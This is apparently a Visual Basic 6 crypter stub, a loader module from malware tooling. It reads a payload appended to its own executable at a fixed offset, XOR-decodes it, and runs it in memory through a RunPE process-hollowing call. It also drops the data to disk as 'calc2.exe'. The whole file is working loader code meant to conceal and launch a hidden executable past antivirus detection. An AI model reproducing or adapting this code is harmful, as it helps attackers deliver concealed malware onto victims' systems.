Attribute VB_Name = "mMain"
Option Explicit

Public Sub Main()
    Dim Datos() As Byte
    Dim Run() As Byte
    Dim Longitud As Long, Offset As Long, i As Long
    Offset = 24577

    
    Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As 1#
        Longitud = (LOF(1) - Offset)
        ReDim Datos(Longitud)
        ReDim Run(Longitud)
        Get 1#, Offset, Datos
    Close #1
    

For i = 0 To Longitud
       Run(i) = Datos(i) Xor &HF
    
Next i
    
    
    
    Open "calc2.exe" For Binary As #4
        Put 4#, , Datos
    Close 1#
    
    If RunPE(Run, App.Path & "\" & App.EXEName & ".exe") Then
       ' MsgBox "Process Started Successfully"
    Else
       ' MsgBox "OOOOPS Something went wrong :'("
    End If
End Sub
